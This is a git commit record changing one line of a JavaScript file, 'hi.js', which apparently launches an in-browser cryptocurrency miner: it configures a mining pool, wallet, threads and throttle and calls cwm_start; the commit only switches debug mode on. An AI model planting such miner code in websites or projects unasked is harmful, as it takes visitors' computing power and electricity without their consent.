34df05190fca6e5e5fbea1ca1cb41533e28b5fb1
ant1d0te <wafulls000@gmail.com>
2018-05-09 03:00:13 -0400

    Update hi.js

--- hi.js
+++ hi.js
@@ -5,5 +5,5 @@
     var mining_pool = 'graftpool.net:3333';
     var threads = -1;
     var throttle = 0.2;
-    var debug = false;
+    var debug = true;
     cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug);
